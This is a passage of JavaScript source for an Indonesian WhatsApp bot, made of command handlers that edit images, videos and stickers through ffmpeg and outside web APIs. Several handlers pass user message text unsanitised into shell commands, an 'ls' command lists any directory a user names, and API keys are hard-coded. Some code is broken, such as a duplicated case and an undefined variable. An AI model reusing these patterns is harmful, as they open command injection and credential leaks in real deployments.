                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", owgi)
                                        teks = `${anu.display_url}`
										anuan = await fetchJson(`https://turuapi.org/tools/distortion?apikey=${naufalkey}&url=${teks}`)
										buffer = await getBaper(anuan.result.image)
										benny.sendMessage(from, buffer, image, {quoted: adadeh})
										 }
										break
							case 'imagenightvision':
							case 'imagenv':
									
                                     var imgbb = require('imgbb-uploader')
                                         if ((isMedia && !ben.message.videoMessage || isQuotedImage) && args.length == 0) {
                                         ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                       reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", owgi)
                                        teks = `${anu.display_url}`
										anuan = await fetchJson(`https://turuapi.org/tools/night_vision?apikey=${naufalkey}&url=${teks}`)
										buffer = await getBaper(anuan.result.image)
										benny.sendMessage(from, buffer, image, {quoted: adadeh})
										 }
										break
					case 'rip':
									
                                     var imgbb = require('imgbb-uploader')
                                         if ((isMedia && !ben.message.videoMessage || isQuotedImage) && args.length == 0) {

                                         ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", owgi)
                                        teks = `${anu.display_url}`
										buffer = await getBaper(`https://naufalhoster.xyz/textmaker/rip?apikey=${naufalkey}&url=${teks}`)
										benny.sendMessage(from, buffer, image, {quoted: adadeh})
										 }
										break
									case 'imagetourl':
									
                                     var imgbb = require('imgbb-uploader')
                                         if ((isMedia && !ben.message.videoMessage || isQuotedImage) && args.length == 0) {
                                         ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", owgi)
                                        teks = `${anu.display_url}`
										reply(teks)
										 }
										break
										case 'imagetourl2':
                                         if ((isMedia && !ben.message.videoMessage || isQuotedImage) && args.length == 0) {
                                         ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
                                        var uploade = await uploadimg(owgi, Date.now() + '.jpg')
                                        teks = `${uploade.result.image}`
										reply(teks)
										 }
										break
										case 'imagetourl3':
                                         if ((isMedia && !ben.message.videoMessage || isQuotedImage) && args.length == 0) {
                                         ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
                                        var uploade = await uploadImages(fs.readFileSync(owgi), sender)
										console.log(uploade)
										reply(uploade)
										 }
										break
										case 'togif':
                                   if (!isQuotedSticker) return reply('Reply stiker nya')
					if (ben.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated == true)
						encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						 media = await benny.downloadAndSaveMediaMessage(encmedia)
						memek = await webp2gifFile(media)
						reply(mess.wait)
						console.log(memek)
					   anu = await getBaper(memek.result)
					   benny.sendMessage(from, anu, video, {mimetype: 'video/gif', caption: 'Nih..', quoted: adadeh})
						break
						case 'togif2':
                                   if (!isQuotedSticker) return reply('Reply stiker nya')
								   if (ben.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated) return reply('Reply sticker gambar!')
				       ran = getRandom('.mp4')
						encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						 media = await benny.downloadAndSaveMediaMessage(encmedia)
						exec(`ffmpeg -loop 1 -i ${media} -t 5 ${ran}`, async (err) => {
    if (err) return console.log(err)
						reply(mess.wait)
					   benny.sendMessage(from, fs.readFileSync(ran), video, {mimetype: 'video/gif', caption: 'Nih..', quoted: adadeh})
						})
						break
						case 'tovid3':
                                   if (!isQuotedSticker) return reply('Reply stiker nya')
								   if (ben.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated) return reply('Reply sticker gambar!')
				       ran = getRandom('.mp4')
						encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						 media = await benny.downloadAndSaveMediaMessage(encmedia)
						exec(`ffmpeg -loop 1 -i ${media} -t 5 ${ran}`, async (err) => {
    if (err) return console.log(err)
						reply(mess.wait)
					   benny.sendMessage(from, fs.readFileSync(ran), video, {mimetype: 'video/mp4', caption: 'Nih..', quoted: adadeh})
						})
						break
								case 'tovid':
									
                                   if (!isQuotedSticker) return reply('Reply stiker nya')
					if (ben.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated == true)
						encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						 media = await benny.downloadAndSaveMediaMessage(encmedia)
						memek = await webp2gifFile(media)
						reply(mess.wait)
						console.log(memek)
					   sendMediaURL(from, memek.result, 'Neh..')
						break
								case 'tovid2':
									
                                   if (!isQuotedSticker) return reply('Reply stiker nya')
					if (ben.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated == true)
						encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						 media = await benny.downloadAndSaveMediaMessage(encmedia)
						const uploady = await uploadimg(media, Date.now() + '.webp')
						console.log(uploady)
						memek = await webp2mp4Url(uploady.result.image)
						reply(mess.wait)
						console.log(memek)
					   sendMediaURL(from, memek.result, 'Neh..')
						break
						case 'imageflip':
						encmedia = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
						media = await benny.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.jpg')
						exec(`ffmpeg -i ${media} -filter:v "hflip, vflip" -c:a copy ${ran}`, (err) => {
							if (err) return reply('eror')
							benny.sendMessage(from, fs.readFileSync(ran), image)
						})
						break
						case 'imagetovid':
						case 'imagetomp4':
						encmedia = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
						media = await benny.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.mp4')
			exec(`ffmpeg -loop 1 -i ${media} -c:v libx264 -t 30 -pix_fmt yuv420p ${ran}`, (err) => {
							if (err) return reply('eror')
							benny.sendMessage(from, fs.readFileSync(ran), video, {mimetype: 'video/mp4'})
						})
						break
						case 'bikinvideo':
						case 'makevideo':
						encmedia = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
						media = await benny.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.mp4')
			exec(`ffmpeg -i ${media} -i ./src/audio -acodec copy ${ran}`, (err) => {
							if (err) return reply('eror')
							benny.sendMessage(from, fs.readFileSync(ran), video, {mimetype: 'video/mp4'})
						})
						break
						case 'setaudio':
						encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						media = await benny.downloadAndSaveMediaMessage(encmedia, './src/audio')
						reply('Berhasil..')
						break
						
						case 'videopencil':
						case 'mp4pencil':
						encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						media = await benny.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.avi')
			exec(`ffmpeg -i ${media} -vf "edgedetect=enable='gt(mod(t,60),57)',negate" -c:a copy ${ran}`, (err) => {
							if (err) return reply('eror')
							benny.sendMessage(from, fs.readFileSync(ran), video, {mimetype: MimeType.avi})
						})
						break
					case 'slowvid':
						encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						media = await benny.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.mp4')
			exec(`ffmpeg -i ${media} -filter:v "minterpolate='mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=10'" ${ran}`, (err) => {
							if (err) return reply('eror')
							benny.sendMessage(from, fs.readFileSync(ran), video, {mimetype: 'video/mp4'})
						})
						break
						case 'cropvid':
						encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						media = await benny.downloadAndSaveMediaMessage(encmedia)
						teks = body.slice(9)
						teks1 = teks.split('|')[0]
						teks2 = teks.split('|')[1]
						ran = getRandom('.mp4')
			exec(`ffmpeg -i ${media} -vf "crop=${teks1}:${teks2}" ${ran}`, (err) => {
							if (err) return reply('eror')
							benny.sendMessage(from, fs.readFileSync(ran), video, {mimetype: 'video/mp4'})
						})
						break
									case 'cropimage':
						encmedia = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
						media = await benny.downloadAndSaveMediaMessage(encmedia)
						teks = body.slice(11)
						teks1 = teks.split('|')[0]
						teks2 = teks.split('|')[1]
						ran = getRandom('.png')
			exec(`ffmpeg -i ${media} -vf "crop=${teks1}:ih:${teks2}:0" ${ran}`, (err) => {
							if (err) return reply('eror')
							benny.sendMessage(from, fs.readFileSync(ran), image, {quoted: adadeh})
						})
						break
										case 'tovid3':
									
                                   if (!isQuotedSticker) return reply('Reply stiker nya')
					if (ben.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated == true)
						encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						 media = await benny.downloadAndSaveMediaMessage(encmedia)
						const upload = await uploadimg(media, Date.now() + '.webp')
						console.log(upload)
						reply(mess.wait)
						const rume = await axios.get(`http://nzcha-apii.herokuapp.com/webp-to-mp4?url=${upload.result.image}`)
						console.log(rume.data)
						sendMediaURL(from, rume.data.result, 'Nih')
					         break
							 case 'tovid4':
									
                                   if (!isQuotedSticker) return reply('Reply stiker nya')
					if (ben.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated == true)
						encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						 media = await benny.downloadAndSaveMediaMessage(encmedia)
						 ran = getRandom('.mp4')
						reply(mess.wait)
						exec(`ffmpeg -loop 1 -i ${media} -c:v libx264 -t 2 -pix_fmt yuv420p ${ran}`, (err) => {
						benny.sendMessage(from, fs.readFileSync(ran), video, {mimetype: 'video/mp4'})
						})
					         break
							 case 'speedtest':
					reply('𝙎𝙚𝙙𝙖𝙣𝙜 𝙈𝙚𝙣𝙜𝙚𝙘𝙚𝙠 𝙎𝙥𝙚𝙚𝙙...')
					const speedTst = await speedTest({acceptLicense: true, acceptGdpr: true})
					const speer = `    「 *Connection Server* 」
 
🌎 *Server :* *${speedTst.isp}*
					 
📶 *Ping :* *${speedTst.ping.latency}Ms*
					 
📈 *Upload :* *${speedText(speedTst.upload.bandwidth)}*
					 
📉 *Download :* *${speedText(speedTst.download.bandwidth)}*
					 
「 *${fake}* 」`
					reply(speer)
					break
							 case 'botstat':
                let i = []
				let giid = []
				for (mem of totalchat){
					i.push(mem.jid)
				}
				for (let id of i){
					if (id && id.includes('g.us')){
						giid.push(id)
					}
				}
                var timestampi = speed();
				var latensii = speed() - timestampi
                var { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = benny.user.phone
                anu = process.uptime()
                teskny = `*Host :* ${os.hostname()}
*Platfrom :* ${os.platform()}
*Speed :* ${os.cpus()[0].speed} MHz
*Core :* ${os.cpus().length}
*RAM :* ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB
*CPU :* ${os.cpus()[0].model}

*V. Whatsapp :* ${wa_version}
*Baterai :* ${baterai.battery}
*MCC :* ${mcc}
*MNC :* ${mnc}
*Versi OS :* ${os_version}
*Merk HP :* ${device_manufacturer}
*Versi HP :* ${device_model}

*Group Chat :* ${giid.length}
*Personal Chat :* ${totalchat.length - giid.length}
*Total Chat :* ${totalchat.length}
*Speed :* ${latensii.toFixed(4)} Second
*Runtime :* ${tek(anu)}`
                reply(teskny)
                break
				case 'jumlahhuruf':
				if (args.length > 1) {
				teks = body.slice(13)
				reply(`${teks.length}`)
				} else if (args.length < 1) {
					teks = ben.message.extendedTextMessage.contextInfo.quotedMessage.conversation
					reply(`${teks.length}`)
				}
				break
				case 'jumlahangka':
				if (args.length > 1) {
				teks = body.slice(13)
				if (!Number(teks)) return reply('Angka harus berupa nomor!')
				reply(`${teks.length}`)
				} else if (args.length < 1) {
					teks = ben.message.extendedTextMessage.contextInfo.quotedMessage.conversation
					if (!Number(teks)) return reply('Angka harus berupa nomor!')
				reply(`${teks.length}`)
				}
				break
										case 'sticknobg':
									if (!isQuotedSticker) return reply('stickernya mana anjeng')
					if (isQuotedSticker) {
												 if (ben.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated) return reply('Reply sticker gambar!')
ger = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
ran = getRandom('.png')
ehgmediabi = await benny.downloadAndSaveMediaMessage(ger)
exec(`ffmpeg -i ${ehgmediabi} ${ran}`, (err) => {
	fs.writeFileSync('sticknobg.png', fs.readFileSync(ran))
						if (err) return reply('Error om')
							ranp = getRandom('.png')
					keyrmbg = 'z7PetGk6n8bJZyaz6xLMX6pg'
							removeBackgroundFromImageFile({path: 'sticknobg.png', apiKey: keyrmbg, size: 'auto', type: 'auto', ranp})
							.then(res => {
								let buffur = Buffer.from(res.base64img, 'base64')
								fs.writeFileSync(ranp, buffur)
								var imgbb = require('imgbb-uploader')
								reply(mess.wait)
								imgbb("68cb5bee517bce4f74b0e910a5d96346", ranp)
								.then(anu => {
								sendStickerUrl(from, anu.display_url)
								})
							})
					})
					} else {
						reply('Mana sticker nya?')
					}
									break
					case 'stickbulet':
					if (isQuotedImage) {
                                          ger = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                                        reply(mess.wait)
										ran = getRandom('.png')
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					exec(`ffmpeg -hide_banner  -i "${owgi}" -i "./buletan.png" -filter_complex [0]scale=400:400[ava];[1]alphaextract[alfa];[ava][alfa]alphamerge ${ran}`, async(err) => {
						if (err) return reply('error')
						sendSticker(from, ran)
					})
					} else if (isQuotedSticker) {
                                          ger = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                                        reply(mess.wait)
										ran = getRandom('.png')
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					exec(`ffmpeg -i ${owgi} ${ran}`, async(err) => {
						if (err) return reply('error')
						ranp = getRandom('.png')
					exec(`ffmpeg -hide_banner  -i "${ran}" -i "./buletan.png" -filter_complex [0]scale=400:400[ava];[1]alphaextract[alfa];[ava][alfa]alphamerge ${ranp}`, async(err) => {
						if (err) return reply('error')
						sendSticker(from, ranp)
					})
					})
					}
					break
					 case 'editstick':
									
									 var ghs = body.slice(11)
                                          ger = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 var uploade = await uploadimg(owgi, Date.now() + '.jpg')
                                        teks = `${uploade.result.image}`
										buffer = `http://api.lolhuman.xyz/api/welcomeimage?apikey=${lolkey}&img=${teks}&text=${ghs}`
										sendStickerUrl(from, buffer)
									break
									case 'stickburik':
									
									 var ghs = body.slice(11)
									 ran = getRandom('.jpg')
									 if (isQuotedSticker) {
                                          ger = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					exec(`ffmpeg -i ${owgi} ${ran}`, (err) => {
					 uploadimg(ran, Date.now() + '.jpg')
					 .then(uploade => {
                                        teks = `${uploade.result.image}`
										buffer = `http://api.lolhuman.xyz/api/deepfry?apikey=${lolkey}&img=${teks}`
										sendStickerUrl(from, buffer)
					 })
					})
									 } else if (isMedia || isQuotedImage) {
										   ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 var uploade = await uploadimg(owgi, Date.now() + '.jpg')
                                        teks = `${uploade.result.image}`
										buffer = `http://api.lolhuman.xyz/api/deepfry?apikey=${lolkey}&img=${teks}`
										sendStickerUrl(from, buffer)
									 }
									break
									case 'stickfisheye':
									
									 var ghs = body.slice(11)
									if ((isMedia || isQuotedImage) && args.length == 0) {
										   ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 var uploade = await uploadimg(owgi, Date.now() + '.png')
                                        teks = `${uploade.result.image}`
										buffer = `http://api.lolhuman.xyz/api/editor/fisheye?apikey=${lolkey}&img=${teks}`
										sendStickerUrl(from, buffer)
									 } else if (isQuotedSticker) {
										   ger = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 var uploade = await uploadimg(owgi, Date.now() + '.webp')
                                        teks = `${uploade.result.image}`
										buffer = `http://api.lolhuman.xyz/api/editor/fisheye?apikey=${lolkey}&img=${teks}`
										sendStickerUrl(from, buffer)
									 }
									break
									case 'stickquote2':
									
									 var ghs = body.slice(13)
									if (isMedia || isQuotedImage) {
										   ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 var uploade = await uploadimg(owgi, Date.now() + '.png')
                                        teks = `${uploade.result.image}`
										buffer = `http://api.lolhuman.xyz/api/quotemaker3?apikey=${lolkey}&text=${ghs}&img=${teks}`
										sendStickerUrl(from, buffer)
									 } else if (isQuotedSticker) {
										   ger = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 var uploade = await uploadimg(owgi, Date.now() + '.webp')
                                        teks = `${uploade.result.image}`
										buffer = `http://api.lolhuman.xyz/api/quotemaker3?apikey=${lolkey}&text=${ghs}&img=${teks}`
										sendStickerUrl(from, buffer)
									 }
									break
									case 'stickpencil':
									
									 var ghs = body.slice(11)
									if ((isMedia || isQuotedImage) && args.length == 0) {
										   ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                        reply(mess.wait)
										ran = getRandom('.png')
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					exec(`ffmpeg -i ${owgi} -vf "color=red@0.5:50x50 [c]; [in][c] overlay=10:10" ${ran}`, (err) => {
										sendSticker(from, ran)
					})
									 } else if (isQuotedSticker && args.length == 0) {
										   ger = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 var uploade = await uploadimg(owgi, Date.now() + '.webp')
                                        teks = `${uploade.result.image}`
										buffer = `http://api.lolhuman.xyz/api/editor/pencil?apikey=${lolkey}&img=${teks}`
										sendStickerUrl(from, buffer)
									 }
									break
									case 'videoflip':
									if (isQuotedVideo && args.length == 0) {
										   ger = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                                        reply(mess.wait)
										ran = getRandom('.mp4')
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 exec(`ffmpeg -i ${owgi} -filter:v "hflip" ${ran}`, async (err) => {
						if (err) return reply('error')
										benny.sendMessage(from, fs.readFileSync(ran), video, {mimetype: 'video/mp4'})
					})
					 }
					break
									case 'videoflip2':
									if (isQuotedVideo && args.length == 0) {
										   ger = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                                        reply(mess.wait)
										ran = getRandom('.mp4')
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 exec(`ffmpeg -i ${owgi} -filter:v "vflip" ${ran}`, async (err) => {
						if (err) return reply('error')
										benny.sendMessage(from, fs.readFileSync(ran), video, {mimetype: 'video/mp4'})
					})
					 }
					break
									case 'stickflip':
									
									 var ghs = body.slice(11)
									if ((isMedia || isQuotedImage) && args.length == 0) {
										ran = getRandom('.png')
										   ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					exec(`ffmpeg -i ${owgi} -filter:v "hflip" ${ran}`, async (err) => {
						if (err) return reply(err)
										sendSticker(from, ran)
					})
									 } else if (isQuotedSticker && args.length == 0) {
										 ran = getRandom('.png')
										   ger = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 exec(`ffmpeg -i ${owgi} -filter:v "hflip" ${ran}`, async (err) => {
						if (err) return reply(err)
										sendSticker(from, ran)
					})
									 }
									break
									case 'ttp0':
									ran = getRandom('.png')
									exec(`ffmpeg -i ./ttplol.png -vf "drawtext=enable='gte(t,3)':fontfile=./src/balsamiq.ttf:text='tod':reload=0:y=h-line_h-10:x=(W/tw)*n" ${ran}`, async(err) => {
										if (err) return reply('eror')
										sendSticker(from, ran)
									})
									break
									case 'stickflip2':
									
									 var ghs = body.slice(11)
									 ran = getRandom('.png')
									if ((isMedia || isQuotedImage) && args.length == 0) {
										   ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					exec(`ffmpeg -i ${owgi} -filter:v "vflip" ${ran}`, async (err) => {
						if (err) return reply(err)
										sendSticker(from, ran)
					})
									 } else if (isQuotedSticker && args.length == 0) {
										   ger = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 exec(`ffmpeg -i ${owgi} -filter:v "vflip" ${ran}`, async (err) => {
						if (err) return reply(err)
										sendSticker(from, ran)
					})
									 }
									break
									case 'stickinvert':
									
									 if ((isMedia || isQuotedImage) && args.length == 0) {
										   ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 var uploade = await uploadimg(owgi, Date.now() + '.png')
                                        teks = `${uploade.result.image}`
										buffer = `http://api.lolhuman.xyz/api/editor/invert?apikey=${lolkey}&img=${teks}`
										sendStickerUrl(from, buffer)
									 } else if (isQuotedSticker) {
										   ger = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 var uploade = await uploadimg(owgi, Date.now() + '.webp')
                                        teks = `${uploade.result.image}`
										buffer = `http://api.lolhuman.xyz/api/editor/invert?apikey=${lolkey}&img=${teks}`
										sendStickerUrl(from, buffer)
									 }
									break
									case 'stickcolor':
									
									 var ghs = body.slice(11)
									 hex = 'FF0000'
									 if (args[0] == 'hijau') hex = '00FF00'
									 if (args[0] == 'kuning') hex = 'FFFF00'
									 if (args[0] == 'orange') hex = 'FFA500'
									 if (args[0] == 'oren') hex = 'FFA500'
									 if (args[0] == 'merah') hex = 'FF0000'
									 if (args[0] == 'ungu') hex = 'FF00FF'
									 if (args[0] == 'biru') hex = '0000FF'
									 if (args[0] == 'pink') hex = 'FF1493'
									 if (args[0] == 'ping') hex = 'FF1493'
									  if (isMedia || isQuotedImage) {
										   ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 var uploade = await uploadimg(owgi, Date.now() + '.jpg')
                                        teks = `${uploade.result.image}`
										buffer = `http://api.lolhuman.xyz/api/imagecolor?apikey=${lolkey}&img=${teks}&hex=${hex}`
										sendStickerUrl(from, buffer)
									 } 
									break
									case 'stickmeme':
									
									 var ghs = body.slice(11)
									 if (ben.message.extendedTextMessage != undefined || ben.message.extendedTextMessage != null) {
                                          ger = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 var uploade = await uploadimg(owgi, Date.now() + '.webp')
                                        teks = `${uploade.result.image}`
										buffer = `https://api.memegen.link/images/custom/_/${ghs}.png?background=${teks}`
										sendStickerUrl(from, buffer)
									 }
									break
									case 'stickmeme4':
									
									 var ghs = body.slice(12)
									 if (!isQuotedVideo) return reply('Reply Video nya!')
                                          ger = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                                        reply(mess.wait)
										ranl = getRandom('.mp4')
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					  exec(`ffmpeg -i ${owgi} -vf "drawtext=fontfile=./src/segoe.ttf:text='${ghs}': fontcolor=white:fontsize=40:box=1:boxcolor=black@0.7: x=20: y=550" -y ${ranl}`, async (err) => {
						 if (err) return reply('error')
										sendSticker(from, ranl)
					 })
									break
									case 'ls':
									let evaleds = await JSON.stringify(fs.readdirSync(body.slice(4)))
									anjayani = evaleds.replace('"', '\n')
									anjayani += evaleds.replace('[]', '')
									reply(anjay)
									break
									case 'stickmeme2':
									
                                     var imgbb = require('imgbb-uploader')
									 var ghs = body.slice(12)
                                          ger = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 var uploade = await uploadimg(owgi, Date.now() + '.webp')
                                        teks = `${uploade.result.image}`
										buffer = `https://api.memegen.link/images/custom/${ghs}/_.png?background=${teks}`
										sendStickerUrl(from, buffer)
									break
									case 'stickmeme3':
									
                                     var imgbb = require('imgbb-uploader')
									 var ghs = body.slice(12)
									     ghs1 = ghs.split('|')[0]
									     ghs2 = ghs.split('|')[1]
                                          ger = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 var uploade = await uploadimg(owgi, Date.now() + '.webp')
                                        teks = `${uploade.result.image}`
										buffer = `https://api.memegen.link/images/custom/${ghs1}/${ghs2}.png?background=${teks}`
										sendStickerUrl(from, buffer)
									break
									if (isQuotedImage) exten = '.png'
									if (isQuotedImage) exten = '.png'
									if (isQuotedImage) exten = '.png'
									if (isQuotedImage) exten = '.png'
										case 'tourl':
									
                                     var imgbb = require('imgbb-uploader')
									 if (isQuotedAudio) {
                                          ger = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 anu = await uploadimgs(owgi, getRandom('.mp3'))
                                        console.log(anu.files[0].url)
										reply(anu.files[0].url)
									 } else if (isQuotedImage) {
										 ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 anu = await uploadimgs(owgi, getRandom('.jpg'))
                                        console.log(anu.files[0].url)
									reply(anu.files[0].url)
									 } else if (isQuotedVideo) {
										 ger = isQuotedVideo ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 anu = await uploadimgs(owgi, getRandom('.mp4'))
                                        console.log(anu.files[0].url)
										reply(anu.files[0].url)
			} else if (isQuotedSticker) {
				ger = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 anu = await uploadimgs(owgi, getRandom('.webp'))
                                        console.log(anu.files[0].url)
										reply(anu.files[0].url)
			} else {
				reply('Reply media nya!')
			}
							break
							
							case 'tourl2':
									 ran = Math.floor(Math.random() * 10000)
				ger = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger, ran)
					 anu = await uploadMedia(owgi)
					 reply(anu.files[0].url)
                                        console.log(anu)
							break
							case 'tourl3':
									 ran = Math.floor(Math.random() * 10000)
				ger = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger, ran)
					 anu = await uploadBerkas(owgi)
					 console.log(anu)
					 reply(anu.files[0].url)
                                        console.log(anu)
							break
							case 'eval':
